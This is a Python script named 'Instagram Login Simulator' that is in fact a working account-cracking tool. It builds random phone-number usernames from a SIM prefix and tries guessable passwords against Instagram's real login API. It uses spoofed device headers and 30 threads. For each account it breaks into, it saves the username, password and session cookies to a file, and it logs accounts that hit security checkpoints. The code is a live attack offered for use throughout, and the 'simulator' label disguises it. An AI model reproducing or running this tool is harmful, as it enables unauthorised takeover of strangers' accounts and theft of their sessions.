#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Login Simulator - Updated with Real Headers
Author: BITHIKA
Version: 3.0
"""
import hashlib
import uuid
import time
import urllib.parse
import random
import requests
import re
import json
import base64
import sys
import string
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Global variables
loop = 0
oks = []
cps = []
idz = []
bkas = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        print('\n' * 100)

def linex():
    print(f"\033[1;97m{'='*56}")

def generate_device_id():
    """Generate real Instagram device ID"""
    return f"android-{uuid.uuid4().hex[:16]}"

def generate_family_device_id():
    """Generate family device ID"""
    return str(uuid.uuid4())

def generate_android_id():
    """Generate Android ID hash"""
    return uuid.uuid4().hex[:16]

def generate_phone_id():
    """Generate phone ID"""
    return uuid.uuid4().hex[:16]

def instagram_uaa():
    """Generate real Instagram user agent"""
    # Real Instagram user agents
    android_versions = [
        "31/12", "30/11", "32/13", "29/10", "33/14"
    ]
    
    dpis = ["420dpi", "440dpi", "480dpi", "560dpi"]
    resolutions = ["1080x2400", "1440x3088", "1080x2340", "1440x3200"]
    
    models = [
        ("SM-G991B", "r0q"), ("SM-G996B", "t2q"), ("SM-G998B", "p3q"),
        ("SM-S901E", "g0s"), ("SM-S906E", "g0s2"), ("SM-S908E", "b0s"),
        ("SM-S911B", "dm1q"), ("SM-S916B", "dm2q"), ("SM-S918B", "dm3q"),
        ("SM-N986B", "c1s"), ("SM-A536B", "a53x"), ("SM-A546B", "a54x")
    ]
    
    lang = random.choice(["en_US", "en_GB", "hi_IN", "id_ID", "es_ES"])
    model, code = random.choice(models)
    android = random.choice(android_versions)
    dpi = random.choice(dpis)
    res = random.choice(resolutions)
    
    # Instagram version format: 4xx.0.0.x.xx
    version = f"{random.randint(400, 450)}.0.0.{random.randint(30, 99)}"
    
    insta = f"Instagram {version} Android ({android}; {dpi}; {res}; samsung; {model}; {code}; qcom; {lang}; {random.randint(100000000, 999999999)})"
    return insta

def generate_ig_headers(uid, pw, session):
    """Generate real Instagram login headers"""
    
    # Generate all required IDs
    device_id = generate_device_id()
    family_device_id = generate_family_device_id()
    android_id = generate_android_id()
    phone_id = generate_phone_id()
    
    # Generate device hash
    first_hash = hashlib.md5()
    first_hash.update(uid.encode('utf-8') + pw.encode('utf-8'))
    first_hex = first_hash.hexdigest()
    
    second_hash = hashlib.md5()
    second_hash.update(first_hex.encode('utf-8') + '12345'.encode('utf-8'))
    android_id_hash = second_hash.hexdigest()[:16]
    
    # Generate user agent
    useragent = instagram_uaa()
    
    # Real Instagram headers
    headers = {
        'host': 'i.instagram.com',
        'x-ig-app-locale': 'en_US',
        'x-ig-device-locale': 'en_US',
        'x-ig-mapped-locale': 'en_US',
        'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
        'x-pigeon-rawclienttime': f'{time.time():.3f}',
        'x-bloks-version-id': '6adad6ddcf881309563e39c76b02644b25881967a792783d4c22df37b5992d3b',
        'x-ig-www-claim': '0',
        'x-bloks-is-prism-enabled': 'false',
        'x-bloks-is-layout-rtl': 'false',
        'x-ig-device-id': device_id,
        'x-ig-family-device-id': family_device_id,
        'x-ig-android-id': f'android-{android_id_hash}',
        'x-fb-connection-type': 'MOBILE.LTE',
        'x-ig-connection-type': 'MOBILE(LTE)',
        'x-ig-capabilities': '3brTv10=',
        'priority': 'u=3',
        'user-agent': useragent,
        'accept-language': 'en-US, en',
        'x-mid': '',
        'ig-intended-user-id': '0',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-fb-http-engine': 'Liger',
        'x-fb-client-ip': 'True',
        'x-fb-server-cluster': 'True',
        'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
        'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
        'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
        'x-ig-app-id': '1217981644879628',
        'connection': 'keep-alive'
    }
    
    return headers, device_id, family_device_id, android_id_hash

def create_login_payload(uid, pw, android_id_hash, family_device_id):
    """Create real Instagram login payload"""
    
    timestamp = int(time.time())
    encoded_username = urllib.parse.quote(uid)
    encoded_password = urllib.parse.quote(pw)
    
    # Real Instagram password encryption format
    encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
    
    # Real Instagram login payload
    payload = {
        "client_input_params": {
            "device_id": f"android-{android_id_hash}",
            "login_attempt_count": 1,
            "secure_family_device_id": "",
            "machine_id": "",
            "accounts_list": [],
            "auth_secure_device_id": "",
            "password": encrypted_password,
            "family_device_id": family_device_id,
            "fb_ig_device_id": [],
            "device_emails": [],
            "try_num": 3,
            "event_flow": "login_manual",
            "event_step": "home_page",
            "openid_tokens": {},
            "client_known_key_hash": "",
            "contact_point": encoded_username,
            "encrypted_msisdn": ""
        },
        "server_params": {
            "username_text_input_id": "p5hbnc:46",
            "device_id": f"android-{android_id_hash}",
            "should_trigger_override_login_success_action": 0,
            "server_login_source": "login",
            "waterfall_id": str(uuid.uuid4()),
            "login_source": "Login",
            "INTERNAL__latency_qpl_instance_id": random.randint(100000000, 999999999),
            "reg_flow_source": "login_home_native_integration_point",
            "is_platform_login": 0,
            "is_caa_perf_enabled": 0,
            "credential_type": "password",
            "family_device_id": family_device_id,
            "INTERNAL__latency_qpl_marker_id": 36707139,
            "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
            "INTERNAL_INFRA_THEME": "harm_f",
            "password_text_input_id": "p5hbnc:47",
            "ar_event_source": "login_home_page"
        }
    }
    
    return payload, encrypted_password

def extract_login_cookies(response):
    """Extract cookies from Instagram login response"""
    cookies_dict = {}
    
    try:
        # Extract from set-cookie headers
        if 'set-cookie' in response.headers:
            set_cookie = response.headers['set-cookie']
            for cookie_part in set_cookie.split(','):
                if '=' in cookie_part:
                    key, value = cookie_part.split('=', 1)
                    cookies_dict[key.strip()] = value.split(';')[0].strip()
        
        # Extract from response headers
        if 'ig-set-authorization' in response.headers:
            auth_header = response.headers['ig-set-authorization']
            if 'Bearer IGT:2:' in auth_header:
                b64_part = auth_header.split('Bearer IGT:2:')[1]
                try:
                    decoded = json.loads(base64.urlsafe_b64decode(b64_part))
                    if isinstance(decoded, dict):
                        cookies_dict.update(decoded)
                except:
                    pass
        
        # Extract from response text
        if response.text:
            try:
                # Try to parse JSON response
                response_json = response.json()
                if 'logged_in_user' in response_json:
                    user_data = response_json.get('logged_in_user', {})
                    if 'pk' in user_data:
                        cookies_dict['user_id'] = str(user_data['pk'])
                    if 'username' in user_data:
                        cookies_dict['username'] = user_data['username']
            except:
                pass
                
    except Exception as e:
        print(f"[Cookie Error] {e}")
    
    return cookies_dict

def crack(uid, password_list, total_count):
    """Enhanced Instagram login function with real headers"""
    
    with counter_lock:
        global loop
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[⚡] {progress} \033[1;92m✓{success_count}\033[1;97m/\033[1;91m✗{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]    ")
            sys.stdout.flush()
            
            # Create session with retry
            session = requests.Session()
            session.max_redirects = 5
            session.timeout = 15
            
            # Generate headers
            headers, device_id, family_device_id, android_id_hash = generate_ig_headers(uid, pw, session)
            
            # Create login payload
            payload, encrypted_password = create_login_payload(uid, pw, android_id_hash, family_device_id)
            
            # Convert payload to JSON
            params_json = json.dumps(payload)
            encoded_params = urllib.parse.quote(params_json)
            
            # Prepare the complete encoded string
            encode = f'params={encoded_params}&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=6adad6ddcf881309563e39c76b02644b25881967a792783d4c22df37b5992d3b'
            
            # Update content-length
            headers['content-length'] = str(len(encode))
            
            # Real Instagram login URL
            url = 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/'
            
            # Make the request
            response = session.post(
                url, 
                data=encode, 
                headers=headers, 
                allow_redirects=True,
                timeout=15
            )
            
            # Check response status
            response_text = response.text.replace('\\', '')
            
            # Success detection
            if response.status_code == 200:
                # Check for logged_in_user
                if "logged_in_user" in response_text:
                    # Extract cookies
                    cookies = extract_login_cookies(response)
                    
                    # Extract user info
                    user_id = "unknown"
                    username = uid
                    try:
                        response_json = response.json()
                        if 'logged_in_user' in response_json:
                            user_data = response_json['logged_in_user']
                            user_id = user_data.get('pk', 'unknown')
                            username = user_data.get('username', uid)
                    except:
                        pass
                    
                    print(f"\r\033[1;92m [✓ SUCCESS] {username} | {pw} (UserID: {user_id})                    ")
                    print(f"\033[1;90m Cookies: {str(cookies)[:100]}...")
                    
                    # Save success
                    try:
                        with open("/sdcard/SUMON_INS_IDS.txt","a") as f:
                            f.write(f"{username}|{pw}|{user_id}|{json.dumps(cookies)}\n")
                    except:
                        with open("SUMON_INS_IDS.txt","a") as f:
                            f.write(f"{username}|{pw}|{user_id}|{json.dumps(cookies)}\n")
                    
                    oks.append(uid)
                    return True
                    
                elif "challenge_required" in response_text:
                    print(f"\r\033[1;93m [⚠ CHALLENGE] {uid}                    ")
                    try:
                        with open("/sdcard/SUMON_INS_CH.txt","a") as f:
                            f.write(f"{uid}|{pw}\n")
                    except:
                        with open("SUMON_INS_CH.txt","a") as f:
                            f.write(f"{uid}|{pw}\n")
                    cps.append(uid)
                    continue
                    
                elif "checkpoint_required" in response_text:
                    print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid}                    ")
                    try:
                        with open("/sdcard/SUMON_INS_CP.txt","a") as f:
                            f.write(f"{uid}|{pw}\n")
                    except:
                        with open("SUMON_INS_CP.txt","a") as f:
                            f.write(f"{uid}|{pw}\n")
                    cps.append(uid)
                    continue
                    
                elif "invalid_credentials" in response_text:
                    # Failed login - silent
                    continue
                else:
                    # Other response - silent
                    continue
            else:
                # Non-200 response - silent
                continue
                
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(1)
        return False
    except requests.exceptions.RequestException as e:
        return False
    except KeyboardInterrupt:
        raise
    except Exception as e:
        return False
    
    return False

def instagram_uaa():
    """Generate real Instagram user agent"""
    android_versions = ["31/12", "30/11", "32/13", "29/10", "33/14"]
    dpis = ["420dpi", "440dpi", "480dpi", "560dpi"]
    resolutions = ["1080x2400", "1440x3088", "1080x2340", "1440x3200"]
    
    models = [
        ("SM-G991B", "r0q"), ("SM-G996B", "t2q"), ("SM-G998B", "p3q"),
        ("SM-S901E", "g0s"), ("SM-S906E", "g0s2"), ("SM-S908E", "b0s"),
        ("SM-S911B", "dm1q"), ("SM-S916B", "dm2q"), ("SM-S918B", "dm3q"),
        ("SM-N986B", "c1s"), ("SM-A536B", "a53x"), ("SM-A546B", "a54x")
    ]
    
    lang = random.choice(["en_US", "en_GB", "hi_IN", "id_ID", "es_ES"])
    model, code = random.choice(models)
    android = random.choice(android_versions)
    dpi = random.choice(dpis)
    res = random.choice(resolutions)
    
    version = f"{random.randint(400, 450)}.0.0.{random.randint(30, 99)}"
    
    insta = f"Instagram {version} Android ({android}; {dpi}; {res}; samsung; {model}; {code}; qcom; {lang}; {random.randint(100000000, 999999999)})"
    return insta

def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        uid[:6],      # First 6 digits
        uid[:7],      # First 7 digits
        uid[:8],      # First 8 digits
        uid[4:],      # Last 6 digits
        uid,          # Full number
        uid[2:],      # Remove first 2
        '123456',     # Common
        'password',   # Common
        '57273200',   # Static common password
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🎯 INSTAGRAM LOGIN SIMULATOR 🎯")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m100, 500, 1000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
        if limit > 5000:
            print(f" \033[1;93m[!] Limiting to 5000 for performance")
            limit = 5000
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 100")
        limit = 100
        time.sleep(1)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🔥 STARTING INSTAGRAM LOGIN TEST 🔥")
    print(f"\033[1;96m{'='*56}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mUsing real Instagram headers")
    print(f' \033[1;33m[•] \033[1;37mResults saved to: \033[1;32mSUMON_INS_IDS.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                pass
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED!")
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;97m[📊] Total Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed/Challenged: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Time: \033[1;93m{execution_time:.2f}s")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.1f}/s")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*56}")
        print(f"\033[1;96m     🚀 INSTAGRAM LOGIN SIMULATOR v3.0 🚀")
        print(f"\033[1;96m{'='*56}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Run Login Test")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*56}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*56}")
            print(f" \033[1;97m[✅] Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Processed: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Total successful: {len(oks)}")
            time.sleep(2)
            break
        else:
            print(f" \033[1;91m[!] Invalid option!")
            time.sleep(1)

if __name__ == "__main__":
    try:
        # Check for required modules
        try:
            import requests
        except ImportError:
            print(f"\033[1;91m[!] Missing required modules!")
            print(f"\033[1;91m[!] Please install: pip install requests")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Interrupted. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error: {e}")
        sys.exit(1)
